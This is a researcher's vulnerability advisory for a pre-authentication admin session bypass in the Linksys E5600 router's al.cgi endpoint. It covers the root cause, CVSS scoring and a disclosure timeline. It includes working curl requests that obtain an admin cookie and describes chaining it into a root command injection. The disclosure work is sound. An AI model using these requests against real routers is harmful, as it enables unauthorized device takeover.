# CVE-TBD: Linksys E5600 al.cgi Pre-Authentication Admin Session Creation

## Affected Product

- Vendor: Linksys
- Product: E5600
- Firmware: v1.1.0.26 (latest available at time of research)
- Component: `/www/cgi-bin/al.cgi` (MIPS32 ELF binary, web management interface)

## Summary

The `/cgi-bin/al.cgi` endpoint of the Linksys E5600 web management interface
creates a fully authenticated **admin** session (level=2) for any
unauthenticated requester, without verifying any credential, password, or
device state. This constitutes a complete pre-authentication bypass of the
web management interface and chains directly into multiple known command
injection vulnerabilities in the authenticated Lua API (e.g.
CVE-2024-33789, CVE-2025-29228), turning them into unauthenticated remote
root command execution.

## Vulnerability Type / CWE

- CWE-306: Missing Authentication for Critical Function

## Root Cause

The CGI's main routine (decompiled; function at 0x00401790 in al.cgi)
**unconditionally**:

1. Writes `/tmp/httpd_session` containing:
   ```
   status=1
   login_time=<uptime>
   sessionid=<numeric id>
   username=admin
   iNeedSession=1
   level=2
   ```
2. Sends signal 35 to the lighttpd process to hot-reload the session file.
3. Returns `Set-Cookie: HSESSIONID=<id>` to the caller.

No password comparison, account lookup, NVRAM state check, or any other
gate exists on this path. The endpoint is also not covered by the
`mod_session` filter in practice (verified dynamically).

## Proof of Concept (non-destructive)

```bash
# No cookies, no credentials of any kind:
curl -i -X POST http://<ROUTER_IP>/cgi-bin/al.cgi -d '{}'
```

Observed result (isolated rehosted firmware):

```
HTTP/1.1 200 OK
Set-Cookie: HSESSIONID=172335611791626904
```

Session file written on the device:

```
status=1
username=admin
level=2
```

The returned `HSESSIONID` cookie is accepted by `mod_session` for all
protected URIs (`/API`, `.cgi`, `.html`), e.g.:

```bash
curl -X POST http://<ROUTER_IP>/API/info \
  -b "HSESSIONID=<id>" \
  -H "Referer: http://<ROUTER_IP>/system-status.html" \
  -H "Content-Type: application/json" \
  -d '{"pingTest":{...}}'   # -> command injection as root (see CVE-2024-33789)
```

## Impact

- Unauthenticated attacker obtains full administrative web session.
- All authenticated web functionality becomes pre-authentication, including
  multiple published command injections in the Lua API layer, yielding
  remote code execution as **root** (the web stack runs as root).

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**
(AV:N/9.8 justifiable if the management interface is internet-exposed.)

## Discovery

- Date: 2026-10-10
- Method: firmware rehosting (QEMU) + static reverse engineering (Ghidra) + dynamic verification
- Researcher: Zimo-666

## Timeline

- 2026-10-10: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
